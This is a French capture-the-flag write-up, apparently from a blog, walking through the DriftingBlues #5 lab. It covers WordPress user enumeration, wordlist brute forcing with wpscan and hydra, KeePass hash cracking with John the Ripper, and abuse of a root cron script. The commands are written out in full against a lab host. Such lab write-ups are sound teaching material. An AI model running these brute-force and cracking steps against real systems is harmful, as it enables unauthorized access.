# Solution du CTF DriftingBlues #5 de VulnHUb

Le 5ème élément
---------------

Challenge téléchargeable sur VulnHub [à cette adresse](https://www.vulnhub.com/entry/driftingblues-5,662/). Nmap nous indique tout de suite la présence d'un Wordpress.  

```plain
$ sudo nmap -sCV -T5 -p- 192.168.56.10 
[sudo] Mot de passe de root :  
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.56.10 
Host is up (0.00039s latency). 
Not shown: 65533 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 
| ssh-hostkey:  
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA) 
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA) 
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519) 
80/tcp open  http    Apache httpd 2.4.38 ((Debian)) 
|_http-generator: WordPress 5.6.2 
|_http-title: diary – Just another WordPress site 
|_http-server-header: Apache/2.4.38 (Debian)
```

C'est toujours mieux d'avoir un outil pour énumérer les utilisateurs au lieu de le faire à la main :  

```plain
$ docker run -it --rm wpscanteam/wpscan --url http://192.168.56.10/ -e ap,at,u
--- snip ---

[+] abuzerkomurcu 
 | Found By: Author Posts - Author Pattern (Passive Detection) 
 | Confirmed By: 
 |  Rss Generator (Passive Detection) 
 |  Wp Json Api (Aggressive Detection) 
 |   - http://192.168.56.10/index.php/wp-json/wp/v2/users/?per_page=100&page=1 
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) 
 |  Login Error Messages (Aggressive Detection) 

[+] gill 
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) 
 | Confirmed By: Login Error Messages (Aggressive Detection) 

[+] collins 
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) 
 | Confirmed By: Login Error Messages (Aggressive Detection) 

[+] satanic 
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) 
 | Confirmed By: Login Error Messages (Aggressive Detection) 

[+] gadd 
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) 
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Comme cette série de CTFs se prête volontiers aux jeux de pistes j'ai directement extrait les mots des pages web en utilisant CeWL. Exemple :  

```plain
$ docker run -it --rm cewl http://192.168.56.10/index.php/2021/02/24/a-deep-dive-on-the-blancpain-fifty-fathoms/ >> words.txt
```

Bien sûr on prendra soin de trier et de retirer les doublons (voir pages de manuel de sort et uniq) avant de bruteforcer.  

```plain
$ docker run -v /tmp/:/data -it --rm wpscanteam/wpscan --url http://192.168.56.10/ -U abuzerkomurcu,gill,collins,satanic,gadd -P /data/words.txt
--- snip ---
[!] Valid Combinations Found: 
 | Username: gill, Password: interchangeable
```

Hmmm cet utilisateur n'est pas l'admin. Il peut uploader des médias mais le type de fichier est vérifié...  

Sur le Wordpress je remarque une page de brouillon baptisée *Privacy Policy — Draft, Privacy Policy Page* malheureusement je ne peux pas y accéder.  

Dans la liste des images uploadées il y a le fichier *dblogo.png*. Il ne m'avait pas spécialement attiré, d'autant plus que les dossiers sous */wp-content/uploads/* sont listables, il n'y a donc aucun besoin d'obtenir un compte sur le Wordpress pour le retrouver. Quoiqu'il en soit si on le regarde avec un éditeur hexa on trouve ce tag EXIF :  

```html
<rdf:li photoshop:LayerName="ssh password is 59583hello of course it is lowercase maybe not " photoshop:LayerText="ssh password is 59583hello of course it is lowercase maybe not :)"/>
```

Je n'avais pas envie de me casser la tête dessus alors j'ai réutilisé un code Python [ici](https://www.geeksforgeeks.org/permute-string-changing-case/). Il n'est pas parfait, il génère des dupliquas quand le mot contient des caractères autres que des lettres.  

Une fois la wordlist avec les permutations générées on se rend compte que ça ne servait à rien :  

```plain
$ hydra -L users.txt -P cases.txt ssh://192.168.56.10 
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 160 login tries (l:5/p:32), ~10 tries per task 
[DATA] attacking ssh://192.168.56.10:22/ 
[22][ssh] host: 192.168.56.10   login: gill   password: 59583hello 
1 of 1 target successfully completed, 1 valid password found
```

L'accès SSH obtenu permet d'obtenir un premier flag.  

Password exchange
-----------------

Dans le dossier de l'utilisateur se trouve une archive pour le gestionnaire de mots de passe Keypass. On utilise un utilitaire de *John The Ripper* pour en obtenir un hash :  

```plain
$ keepass2john keyfile.kdbx  
keyfile:$keepass$*2*60000*0*86fe1a63955b5984c0adb127a869153f24c41fdc56678d555f778d1309f9867c*e580d1bef4bf0f44b845fce13c9648cd22f143760be5bae503a419a7f76a21f0*e99d45aab90c26200191dbca6b3fae34*e3169392c5eec5e094b
1f22a01084f894598280874de2bf8291ea2185051f7e3*78d0b1eb59343754ce0ce33b2efb5e25c595317099a65ed208bfc2f6ab8c8dcd
```

C'est cassé relativement rapidement sans GPU :  

```plain
$ john --wordlist=rockyou.txt  hash.txt 
Using default input encoding: UTF-8 
Loaded 1 password hash (KeePass [SHA256 AES 32/64]) 
Cost 1 (iteration count) is 60000 for all loaded hashes 
Cost 2 (version) is 2 for all loaded hashes 
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes 
Will run 4 OpenMP threads 
Press 'q' or Ctrl-C to abort, almost any other key for status 
porsiempre       (keyfile)
```

On en extrait les entrées suivantes :  

```plain
2real4surreal
buddyretard
closet313
exalted
fracturedocean
zakkwylde
```

Aucun de ces mots de passe n'est accepté pour *root* que ce soit via *su* ou *SSH*... oups.  

LinPEAS indique la présence d'un dossier inhabituel à la racine :  

```plain
╔══════════╣ Unexpected in root 
/vmlinuz.old 
/initrd.img 
/initrd.img.old 
/vmlinuz 
/keyfolder
```

Ce dernier dossier est vide... WTF !  

Si on vérifie les processus lancés sur la machine avec *pspy* on voit une tache cron :  

```plain
2022/01/20 13:00:01 CMD: UID=0    PID=14314  | /usr/sbin/CRON -f  
2022/01/20 13:00:01 CMD: UID=0    PID=14315  | /bin/sh -c /root/key.sh  
2022/01/20 13:00:01 CMD: UID=0    PID=14316  | /bin/bash /root/key.sh
```

Et le script en question n'est pas accessible. Ma seule idée a été de créer des fichiers ayant le nom des pass précédemment trouvés dans le dossier. L'idée était finalement correcte mais il ne fallait placer qu'un seul fichier à la fois. Ainsi avec *fracturedocean* la tache CRON faisait apparaître un fichier *rootcreds.txt* avec le contenu suivant :  

```plain
root creds 

imjustdrifting31
```

Ces identifiants permettent bien sûr l'accès root et l'obtention du flag final.  

Sous le capot
-------------

Voici le script lié à la tache CRON :  

```bash
#!/bin/bash 

if [[ $(ls /keyfolder) == "fracturedocean" ]]; then 
        echo "root creds" >> /keyfolder/rootcreds.txt 
        echo "" >> /keyfolder/rootcreds.txt 
        echo "imjustdrifting31" >> /keyfolder/rootcreds.txt 
fi

```

Un peu déçu sur ce CTF par rapport aux autres en raison d'un peu de guessing. Il aurait fallut que l'image ait un nom plus explicite et le script final devrait fonctionner à partir du moment où le fichier attendu est présent.  


*Published January 20 2022 at 18:11*